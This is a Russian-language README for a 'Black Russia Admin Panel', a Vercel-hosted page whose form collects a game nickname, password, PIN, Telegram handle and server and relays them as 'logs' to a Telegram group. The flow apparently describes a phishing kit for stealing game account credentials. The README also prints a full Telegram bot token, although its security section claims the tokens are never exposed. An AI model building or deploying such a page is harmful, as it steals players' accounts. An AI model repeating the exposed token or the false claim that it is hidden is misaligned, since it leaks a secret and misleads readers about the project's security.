# Black Russia Admin Panel

Защищённая админ-панель с логированием в Telegram через Vercel.

## 🚀 Развёртывание на Vercel

### 1. Создайте проект на Vercel

```bash
# Если у вас есть Vercel CLI установлен:
vercel

# Или вручную:
# 1. Перейдите на https://vercel.com
# 2. Click "Create" → "Project"
# 3. Импортируйте репозиторий с GitHub
```

### 2. Добавьте переменные окружения

В Dashboard Vercel → Settings → Environment Variables добавьте:

```
TELEGRAM_BOT_TOKEN = 8714107180:AAG9pdz8Ma31DQJdSOHbClE2ZXDTmdTw9XQ
TELEGRAM_CHAT_ID = @logsbrchat
```

### 3. Разверните

```bash
vercel deploy
```

Или просто push на GitHub — Vercel автоматически задеплоится.

## 📁 Структура проекта

```
/admin-panel
├── index.html              # Главная страница админ-панели
├── script.js               # Логика интерфейса
├── style.css               # Стили
├── telegram.js             # Клиентская функция (БЕЗ токенов!)
├── package.json            # Дескриптор проекта
├── vercel.json             # Конфиг Vercel
├── .gitignore              # Исключения Git
└── api/
    └── sendLog.js          # Серверная функция API (точка входа)
```

## 🔐 Безопасность

- **Токены скрыты**: `TELEGRAM_BOT_TOKEN` и `TELEGRAM_CHAT_ID` хранятся на сервере Vercel в переменных окружения.
- **Не видны на GitHub**: исходный код не содержит чувствительные данные.
- **Защищённый API**: запросы проходят через `/api/sendLog`, где проверяется корректность.

## 📝 Использование

### Локально (для разработки)

```bash
# Установите Vercel CLI
npm install -g vercel

# Запустите dev-сервер
vercel dev
```

Откройте `http://localhost:3000` и тестируйте.

### На Vercel (production)

Сайт автоматически доступен по адресу вроде:
```
https://<project-name>.vercel.app
```

## 🧪 Тестирование

1. Откройте панель
2. Заполните форму:
   - Никнейм: `John_Smith`
   - Пароль: `password123` (или `password123,1234` если есть PIN)
   - Telegram: `username` (опционально)
   - Сервер: выберите из списка
3. Нажмите "Подключиться"
4. Проверьте логи в группе `@logsbrchat`

## ❌ Что произойдёт при ошибке

- **400 Bad Request**: пропущено поле `text` в запросе
- **500 Internal Error**: отсутствуют переменные окружения на сервере
- **Telegram error**: бот не в группе, неправильная группа и т.п.

## 📚 Дополнительные ресурсы

- [Vercel Docs](https://vercel.com/docs)
- [Telegram Bot API](https://core.telegram.org/bots/api)
